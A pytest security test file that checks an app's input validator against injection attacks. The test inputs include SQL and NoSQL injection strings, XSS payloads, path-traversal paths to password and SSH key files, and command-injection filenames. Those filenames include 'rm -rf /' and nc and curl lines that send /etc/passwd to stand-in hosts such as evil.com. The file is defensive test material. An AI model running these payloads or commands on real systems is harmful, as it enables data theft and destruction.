"""
Security tests for injection attack prevention.

This module tests for SQL injection, NoSQL injection, path traversal,
XSS, and command injection vulnerabilities.
"""

import pytest
import os
import tempfile
from unittest.mock import patch, MagicMock
import sys
from pathlib import Path

# Add src to path
sys.path.append(str(Path(__file__).parent.parent.parent / "src"))

from src.core.input_validator import (
    sanitize_string, 
    validate_search_query, 
    validate_file_path,
    validate_book_file,
    ValidationError
)


class TestSQLInjectionPrevention:
    """Test SQL injection attack prevention"""
    
    def test_sql_injection_in_search_queries(self):
        """Test SQL injection prevention in search queries"""
        malicious_queries = [
            "'; DROP TABLE books; --",
            "1' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; DELETE FROM embeddings; --",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --",
            "' OR 1=1#",
            "admin'--",
            "' OR 'x'='x",
        ]
        
        for query in malicious_queries:
            with pytest.raises(ValidationError):
                validate_search_query(query)
    
    def test_sql_injection_in_book_titles(self):
        """Test SQL injection prevention in book titles"""
        malicious_titles = [
            "Book'; DROP TABLE books; --",
            "'; UPDATE users SET role='admin' WHERE id=1; --",
        ]
        
        for title in malicious_titles:
            sanitized = sanitize_string(title)
            # Should not contain SQL injection patterns
            assert "DROP" not in sanitized.upper()
            assert "UNION" not in sanitized.upper()
            assert "--" not in sanitized


class TestNoSQLInjectionPrevention:
    """Test NoSQL injection attack prevention (for Qdrant/vector DB)"""
    
    def test_nosql_injection_in_filters(self):
        """Test NoSQL injection prevention in search filters"""
        malicious_filters = [
            {"$where": "function() { return true; }"},
            {"book_id": {"$ne": None}},  # NoSQL injection pattern
            {"$or": [{"book_id": {"$exists": True}}]},
            {"metadata": {"$regex": ".*"}},
        ]
        
        # Test that malicious filter patterns are rejected
        for filter_dict in malicious_filters:
            # This would be called in the search validation logic
            for key in filter_dict.keys():
                if key.startswith('$'):
                    with pytest.raises(ValidationError):
                        validate_search_query(str(filter_dict))


class TestPathTraversalPrevention:
    """Test path traversal attack prevention"""
    
    def test_path_traversal_attacks(self):
        """Test path traversal attack prevention"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "\\..\\..\\..\\etc\\passwd",
            "....//....//....//windows/system32/drivers/etc/hosts",
        ]
        
        for path in malicious_paths:
            with pytest.raises(ValidationError):
                validate_file_path(path)
    
    def test_legitimate_paths_allowed(self):
        """Test that legitimate paths are allowed"""
        legitimate_paths = [
            "data/books/trading_guide.pdf",
            "uploads/user_document.pdf",
            "Knowledge/book_chapter.pdf",
        ]
        
        for path in legitimate_paths:
            # Should not raise ValidationError
            validated_path = validate_file_path(path)
            assert validated_path is not None
    
    def test_absolute_path_prevention(self):
        """Test prevention of absolute paths outside allowed directories"""
        dangerous_absolute_paths = [
            "/etc/passwd",
            "/root/.ssh/id_rsa",
            "C:\\Windows\\System32\\config\\SAM",
            "/proc/self/environ",
            "/var/log/auth.log",
        ]
        
        for path in dangerous_absolute_paths:
            with pytest.raises(ValidationError):
                validate_file_path(path)


class TestXSSPrevention:
    """Test XSS (Cross-Site Scripting) prevention"""
    
    def test_xss_in_search_queries(self):
        """Test XSS prevention in search queries"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//",
            "\"><script>alert('XSS')</script>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
        ]
        
        for payload in xss_payloads:
            sanitized = sanitize_string(payload)
            # Should not contain script tags or javascript
            assert "<script" not in sanitized.lower()
            assert "javascript:" not in sanitized.lower()
            assert "onerror" not in sanitized.lower()
            assert "onload" not in sanitized.lower()
    
    def test_html_entity_encoding(self):
        """Test HTML entity encoding for XSS prevention"""
        dangerous_strings = [
            "<>&\"'",
            "<script>",
            "& < > \" '",
        ]
        
        for string in dangerous_strings:
            sanitized = sanitize_string(string)
            # Should be properly encoded
            assert "&lt;" in sanitized or "<" not in sanitized
            assert "&gt;" in sanitized or ">" not in sanitized
            assert "&amp;" in sanitized or "&" not in sanitized


class TestCommandInjectionPrevention:
    """Test command injection attack prevention"""
    
    def test_command_injection_in_filenames(self):
        """Test command injection prevention in file names"""
        malicious_filenames = [
            "book.pdf; rm -rf /",
            "document.pdf && cat /etc/passwd",
            "file.pdf | nc attacker.com 4444",
            "book.pdf `whoami`",
            "doc.pdf $(cat /etc/passwd)",
            "file.pdf; curl http://evil.com/steal?data=`cat /etc/passwd`",
        ]
        
        for filename in malicious_filenames:
            with pytest.raises(ValidationError):
                validate_book_file(filename)
    
    def test_legitimate_filenames_allowed(self):
        """Test that legitimate filenames are allowed"""
        legitimate_filenames = [
            "trading_guide.pdf",
            "technical_analysis_2023.pdf",
            "market-structure.pdf",
            "book_chapter_1.pdf",
        ]
        
        for filename in legitimate_filenames:
            # Should not raise ValidationError
            validated = validate_book_file(filename)
            assert validated is not None


class TestFileUploadSecurity:
    """Test file upload security measures"""
    
    def test_malicious_file_type_rejection(self):
        """Test rejection of malicious file types"""
        malicious_files = [
            "malware.exe",
            "script.bat",
            "trojan.scr",
            "backdoor.php",
            "shell.jsp",
            "virus.com",
            "fake.pdf.exe",  # Double extension attack
        ]
        
        for filename in malicious_files:
            with pytest.raises(ValidationError):
                validate_book_file(filename)
    
    def test_file_size_limits_enforced(self):
        """Test file size limits are enforced"""
        # Create temporary large file
        with tempfile.NamedTemporaryFile(suffix='.pdf', delete=False) as temp_file:
            # Write data larger than allowed limit (assume 100MB limit)
            large_data = b'0' * (101 * 1024 * 1024)  # 101MB
            temp_file.write(large_data)
            temp_file.flush()
            
            try:
                with pytest.raises(ValidationError):
                    validate_book_file(temp_file.name)
            finally:
                os.unlink(temp_file.name)
    
    def test_file_content_validation(self):
        """Test file content validation"""
        # Create file with PDF extension but non-PDF content
        with tempfile.NamedTemporaryFile(suffix='.pdf', delete=False) as temp_file:
            # Write executable content disguised as PDF
            malicious_content = b'\\x4d\\x5a'  # PE header
            temp_file.write(malicious_content)
            temp_file.flush()
            
            try:
                with pytest.raises(ValidationError):
                    validate_book_file(temp_file.name)
            finally:
                os.unlink(temp_file.name)


class TestInputSanitization:
    """Test general input sanitization"""
    
    def test_special_character_handling(self):
        """Test special character sanitization"""
        dangerous_inputs = [
            "input\x00null_byte",
            "input\nnewline",
            "input\rcarriage_return",
            "input\ttab",
            "input\x1bescaape",
        ]
        
        for input_str in dangerous_inputs:
            sanitized = sanitize_string(input_str)
            # Should not contain control characters
            assert '\x00' not in sanitized
            assert '\n' not in sanitized or sanitized.count('\n') <= 1
            assert '\r' not in sanitized
            assert '\x1b' not in sanitized
    
    def test_unicode_attack_prevention(self):
        """Test Unicode-based attack prevention"""
        unicode_attacks = [
            "admin\\u202e\\u0000admin",  # Right-to-left override
            "\\uFEFFadmin",  # Byte order mark
            "ad\\u200bmin",  # Zero-width space
            "\\u0001admin",  # Start of heading
        ]
        
        for attack in unicode_attacks:
            sanitized = sanitize_string(attack)
            # Should normalize or remove dangerous Unicode
            assert len(sanitized) <= len(attack)
    
    def test_length_limits_enforced(self):
        """Test input length limits are enforced"""
        # Test extremely long input
        long_input = "a" * 10000
        
        with pytest.raises(ValidationError):
            validate_search_query(long_input)
    
    def test_encoding_attack_prevention(self):
        """Test encoding-based attack prevention"""
        encoding_attacks = [
            "%3Cscript%3E",  # URL encoded <script>
            "&lt;script&gt;",  # HTML encoded <script>
            "\\x3Cscript\\x3E",  # Hex encoded <script>
        ]
        
        for attack in encoding_attacks:
            sanitized = sanitize_string(attack)
            # Should not contain decoded dangerous content
            assert "script" not in sanitized.lower() or "<" not in sanitized


if __name__ == "__main__":
    pytest.main([__file__, "-v"])